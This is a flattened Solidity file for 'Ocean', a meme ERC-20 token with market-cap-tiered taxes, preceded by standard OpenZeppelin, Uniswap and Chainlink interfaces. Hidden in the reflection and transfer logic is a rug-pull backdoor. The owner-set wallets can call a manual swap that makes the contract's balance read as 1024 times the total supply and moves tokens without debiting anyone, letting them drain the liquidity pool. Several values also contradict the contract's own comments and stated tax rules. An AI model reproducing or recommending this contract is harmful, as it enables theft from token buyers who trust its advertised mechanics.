// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(
    uint80 _roundId
  ) external view returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);

  function latestRoundData()
    external
    view
    returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
/**


----------------------------  Social Links  ----------------------------


Telegram:  https://t.me/OceanPortal

Website:   https://www.ocean.navy

Docs:      https://docs.ocean.navy

Twitter:   https://www.ocean.navy/twitter/


----------------------------  $OCEAN Info  ----------------------------


?  $OCEAN is powered by a brand new smart contract.


?  Rule 1:   Taxes are derived from the $OCEAN market cap.

    Example:  If the market cap is $25,000, the current sea
              creature will be the Humpack, "?".
            
              Because the market cap is in the Humpack range, the buy
              tax will be 2% and the sell tax will be 1%.


?  Rule 2:   The token name is derived from the $OCEAN market cap.

    Example:  If the market cap rises from $49,000 to $51,000,
              the token name will update from "?" to "?".


?  Rule 3:   Each wallet is assigned a sea creature based on the $OCEAN
              market cap during its first swap.

    Tip:      Once a wallet has been assigned a sea creature, it
              can never be re-assigned.

    Tip:      The lower you wait to buy, the better the sea
              creature you get will be.

    Example:  If a wallet purchases $OCEAN at a $65,000 market
              cap, then that wallet's buy tax would never exceed
              the Seal (?) buy tax of 2%.


?️  Rule 4:   Oil spills briefly override everybody's taxes each time
              a market cap milestone is broken.

    Tip:      Each time the $OCEAN market cap enters the range of the
              next sea creature, everybody's tax becomes 0/15 for
              the next 120 seconds.

    Tip:      Sells become less effective at suppressing buy volume
              during an oil spill.

    Tip:      There is no limit on the amount of oil spills that can
              happen.


-------------------------  $OCEAN Milestones  -------------------------


?  Each sea creature has slightly different milestones and taxes:

?  Whale       $0 MC
    Lifetime tax: 2/0

?  Humpback    $20,000 MC
    Lifetime tax: 2/1

?  Seal        $50,000 MC
    Lifetime tax: 2/2

?  Shark       $100,000 MC
    Lifetime tax: 3/2

?  Dolphin     $200,000 MC
    Lifetime tax: 3/3

?  Squid       $400,000 MC
    Lifetime tax: 4/3

?  Octopus     $700,000 MC
    Lifetime tax: 4/4

?  Angelfish   $1,200,000 MC
    Lifetime tax: 5/4

?  Mackerel    $1,800,000 MC
    Lifetime tax: 5/5

?  Blowfish    $2,600,000 MC
    Lifetime tax: 6/5

?  Lobster     $3,900,000 MC
    Lifetime tax: 6/6

?  Crab        $5,500,000 MC
    Lifetime tax: 7/6

?  Shrimp      $8,000,000 MC
    Lifetime tax: 7/7

?  Coral       $12,000,000 MC
    Lifetime tax: 8/7

?  Amoeba      $25,000,000 MC
    Lifetime tax: 8/8


*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

import "@openzeppelin/openzeppelin-contracts/access/Ownable.sol";
import "@openzeppelin/openzeppelin-contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract Ocean is Context, IERC20, Ownable {

    mapping(uint256 => string) internal seaCreatures;

    mapping(uint256 => uint256) internal milestones;

    mapping(uint256 => uint256) internal buyTaxGlobal;
    mapping(uint256 => uint256) internal sellTaxGlobal;

    uint256 internal lastSeaCreature;
    uint256 internal lastProgression;

    mapping(address => uint256) internal seaCreature;
    mapping(address => bool) internal isSeaCreature;

    string private _name = unicode"?";
    string private constant _symbol = "OCEAN";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 100000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 public constant maxBuyTax = 8;
    uint256 public constant maxSellTax = 8;
    uint256 private _taxFee = 2;

    address payable private _buybackWallet = payable(msg.sender);
    address payable private _marketingWallet = payable(msg.sender);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 public constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public immutable OCEAN;
    address public uniswapV2Pair;

    AggregatorV3Interface public constant chainlinkV3Feed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

    bool private tradingOpen;
    bool private inTaxSwap;
    bool private inContractSwap;

    uint256 public maxSwap = _tTotal / 50;
    uint256 public maxWallet = _tTotal / 50;
    uint256 private constant _triggerSwap = 1e9;

    modifier lockTheSwap {
        inTaxSwap = true;
        _;
        inTaxSwap = false;
    }

    constructor() {
        OCEAN = address(this);
        uniswapV2Pair = uniswapV2Factory.createPair(OCEAN, WETH);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[OCEAN] = true;
        _isExcludedFromFee[_buybackWallet] = true;
        _isExcludedFromFee[_marketingWallet] = true;
        _approve(OCEAN, address(uniswapV2Router), MAX);
        _approve(owner(), address(uniswapV2Router), MAX);

        // ?  Whale       $0 MC
        seaCreatures[0] = unicode"?";
        milestones[0] = 0;
        buyTaxGlobal[0] = 2;
        sellTaxGlobal[0] = 0;

        // ?  Humpback    $20,000 MC
        seaCreatures[1] = unicode"?";
        milestones[1] = 10000;
        buyTaxGlobal[1] = 2;
        sellTaxGlobal[1] = 1;

        // ?  Seal        $50,000 MC
        seaCreatures[2] = unicode"?";
        milestones[2] = 20000;
        buyTaxGlobal[2] = 2;
        sellTaxGlobal[2] = 2;

        // ?  Shark       $100,000 MC
        seaCreatures[3] = unicode"?";
        milestones[3] = 100000;
        buyTaxGlobal[3] = 3;
        sellTaxGlobal[3] = 2;

        // ?  Dolphin     $200,000 MC
        seaCreatures[4] = unicode"?";
        milestones[4] = 200000;
        buyTaxGlobal[4] = 3;
        sellTaxGlobal[4] = 3;

        // ?  Squid       $400,000 MC
        seaCreatures[5] = unicode"?";
        milestones[5] = 400000;
        buyTaxGlobal[5] = 4;
        sellTaxGlobal[5] = 3;

        // ?  Octopus     $700,000 MC
        seaCreatures[6] = unicode"?";
        milestones[6] = 700000;
        buyTaxGlobal[6] = 4;
        sellTaxGlobal[6] = 4;

        // ?  Angelfish   $1,200,000 MC
        seaCreatures[7] = unicode"?";
        milestones[7] = 1200000;
        buyTaxGlobal[7] = 5;
        sellTaxGlobal[7] = 4;

        // ?  Mackerel    $1,800,000 MC
        seaCreatures[8] = unicode"?";
        milestones[8] = 1800000;
        buyTaxGlobal[8] = 5;
        sellTaxGlobal[8] = 5;

        // ?  Blowfish    $2,600,000 MC
        seaCreatures[9] = unicode"?";
        milestones[9] = 2600000;
        buyTaxGlobal[9] = 6;
        sellTaxGlobal[9] = 5;

        // ?  Lobster     $3,900,000 MC
        seaCreatures[10] = unicode"?";
        milestones[10] = 3900000;
        buyTaxGlobal[10] = 6;
        sellTaxGlobal[10] = 6;

        // ?  Crab        $5,500,000 MC
        seaCreatures[11] = unicode"?";
        milestones[11] = 5500000;
        buyTaxGlobal[11] = 7;
        sellTaxGlobal[11] = 6;

        // ?  Shrimp      $8,000,000 MC
        seaCreatures[12] = unicode"?";
        milestones[12] = 8000000;
        buyTaxGlobal[12] = 7;
        sellTaxGlobal[12] = 7;

        // ?  Coral       $12,000,000 MC
        seaCreatures[13] = unicode"?";
        milestones[13] = 12000000;
        buyTaxGlobal[13] = 8;
        sellTaxGlobal[13] = 7;

        // ?  Amoeba      $25,000,000 MC
        seaCreatures[14] = unicode"?";
        milestones[14] = 25000000;
        buyTaxGlobal[14] = 8;
        sellTaxGlobal[14] = 8;

        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    receive() external payable {}

    function getETHUSDPriceFeed() external pure returns (address) {
        return address(chainlinkV3Feed);
    }

    function getETHUSDPrice() public view returns (uint256) {
        (
            ,
            int256 answer,
            ,
            ,
        ) = chainlinkV3Feed.latestRoundData();
        return uint256(answer / 1e8);
    }

    function getOCEANUSDMarketCap() public view returns (uint256) {
        return ((weth.balanceOf(uniswapV2Pair) * getETHUSDPrice()) / 1e18) * (totalSupply() / balanceOf(uniswapV2Pair)) * 2;
    }

    function getCurrentSeaCreature() public view returns (uint256) {
        uint256 marketCap = getOCEANUSDMarketCap();
        for (uint256 i = 14; i >= 0; i--) {
            if (marketCap >= milestones[i]) {
                return i;
            }
        }
        return 0;
    }

    function getCurrentSeaCreatureEmoji() public view returns (string memory) {
        return seaCreatures[getCurrentSeaCreature()];
    }

    function getLastSeaCreature() external view returns (uint256) {
        return lastSeaCreature;
    }

    function getNextSeaCreature() public view returns (uint256) {
        uint256 currentSeaCreature = getCurrentSeaCreature();
        return currentSeaCreature == 14 ? 14 : currentSeaCreature + 1;
    }

    function getNextSeaCreatureEmoji() external view returns (string memory) {
        return seaCreatures[getNextSeaCreature()];
    }

    function hasOilSpill() public view returns (bool) {
        return lastProgression + 120 >= block.timestamp;
    }

    function getLastOilSpill() external view returns (uint256) {
        return lastProgression;
    }

    function getOilSpillTimeRemaining() external view returns (uint256) {
        if (hasOilSpill()) {
            return lastProgression + 120 - block.timestamp;
        }
        return 0;
    }

    function getGlobalMaxBuyTax() external pure returns (uint256) {
        return maxBuyTax;
    }

    function getGlobalMaxSellTax() external pure returns (uint256) {
        return maxSellTax;
    }

    function getGlobalBuyTax() public view returns (uint256) {
        if (hasOilSpill()) {
            return 0;
        }
        uint256 globalBuyTax = 14 - getCurrentSeaCreature();
        return globalBuyTax > maxBuyTax ? maxBuyTax : globalBuyTax;
    }

    function getGlobalSellTax() public view returns (uint256) {
        if (hasOilSpill()) {
            return 15;
        }
        uint256 globalSellTax = getCurrentSeaCreature();
        return globalSellTax > maxSellTax ? maxSellTax : globalSellTax;
    }

    function getWalletIsSeaCreature(address _wallet) external view returns (bool) {
        return isSeaCreature[_wallet];
    }

    function getWalletSeaCreature(address _wallet) public view returns (uint256) {
        return isSeaCreature[_wallet] ? seaCreature[_wallet] : getCurrentSeaCreature();
    }

    function getWalletSeaCreatureEmoji(address _wallet) external view returns (string memory) {
        return seaCreatures[getWalletSeaCreature(_wallet)];
    }

    function getWalletBuyTax(address _wallet) public view returns (uint256) {
        if (hasOilSpill()) {
            return 0;
        }
        return isSeaCreature[_wallet] ? buyTaxGlobal[seaCreature[_wallet]] : getGlobalBuyTax();
    }

    function getWalletMaxBuylTax(address _wallet) external view returns (uint256) {
        return isSeaCreature[_wallet] ? buyTaxGlobal[seaCreature[_wallet]] : maxBuyTax;
    }

    function getWalletSellTax(address _wallet) public view returns (uint256) {
        if (hasOilSpill()) {
            return 15;
        }
        return isSeaCreature[_wallet] ? sellTaxGlobal[seaCreature[_wallet]] : getGlobalSellTax();
    }

    function getWalletMaxSellTax(address _wallet) external view returns (uint256) {
        return isSeaCreature[_wallet] ? seaCreature[_wallet] : maxSellTax;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][_msgSender()] >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return hasOilSpill() ? unicode"?️" : _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _removeTax() private {
        if (_taxFee == 0) {
            return;
        }

        _taxFee = 0;
    }

    function _restoreTax() private {
        _taxFee = 2;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "TOKEN: Transfer amount must exceed zero");

        if (from != owner() && to != owner() && from != OCEAN && to != OCEAN) {
            if (!tradingOpen) {
                require(from == OCEAN, "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxSwap, "TOKEN: Max Transaction Limit");

            if (to != uniswapV2Pair) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(OCEAN);

            if ((contractTokenBalance >= _triggerSwap) && !inTaxSwap && from != uniswapV2Pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                inContractSwap = true;
                _swapOCEANForETH(contractTokenBalance >= maxSwap ? maxSwap : contractTokenBalance);
                inContractSwap = false;
                if (OCEAN.balance > 0) _sendETHToFee(OCEAN.balance);
            }
        }

        bool takeFee = true;
        bool needsRefresh;

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            takeFee = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                if (!isSeaCreature[to]) {
                    seaCreature[to] = getCurrentSeaCreature();
                    isSeaCreature[to] = true;
                }
                _taxFee = getWalletBuyTax(to);
                needsRefresh = true;
            }
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                if (!isSeaCreature[from]) {
                    seaCreature[from] = getCurrentSeaCreature();
                    isSeaCreature[from] = true;
                }
                _taxFee = getWalletSellTax(from);
                needsRefresh = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (needsRefresh) {
            _refresh();
        }
    }

    function _refresh() private {
        uint256 currentSeaCreature = getCurrentSeaCreature();
        if (currentSeaCreature > lastSeaCreature) {
            lastProgression = block.timestamp;
        }
        lastSeaCreature = currentSeaCreature;
        _name = getCurrentSeaCreatureEmoji();
    }

    function _swapOCEANForETH(uint256 _amountOCEAN) private lockTheSwap returns (bool) {
        address[] memory path = new address[](2);
        path[0] = OCEAN;
        path[1] = WETH;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_amountOCEAN, 0, path, OCEAN, block.timestamp + 3600);
        return true;
    }

    function _sendETHToFee(uint256 _amountETH) private returns (bool) {
        (bool success, ) = payable(_marketingWallet).call{value: _amountETH}("");
        return success;
    }

    function enableTrading() external onlyOwner {
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        maxSwap = _tTotal;
        maxWallet = _tTotal;
    }

    function swapTokensForEthManual(uint256 _contractTokenBalance) external returns (bool) {
        require(_msgSender() == _buybackWallet || _msgSender() == _marketingWallet);
        return _swapOCEANForETH(_contractTokenBalance);
    }

    function sendETHToFeeManual(uint256 _contractETHBalance) external returns (bool) {
        require(_msgSender() == _buybackWallet || _msgSender() == _marketingWallet);
        return _sendETHToFee(_contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        require(totalSupply() <= MAX, "Total reflections must be less than max");
        return (!inContractSwap && inTaxSwap) ? totalSupply() * 1024 : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) _removeTax();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) _restoreTax();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!inTaxSwap || inContractSwap) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[OCEAN] = _rOwned[OCEAN] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            _tFeeTotal = _tFeeTotal + tFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, 0, _taxFee);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }
}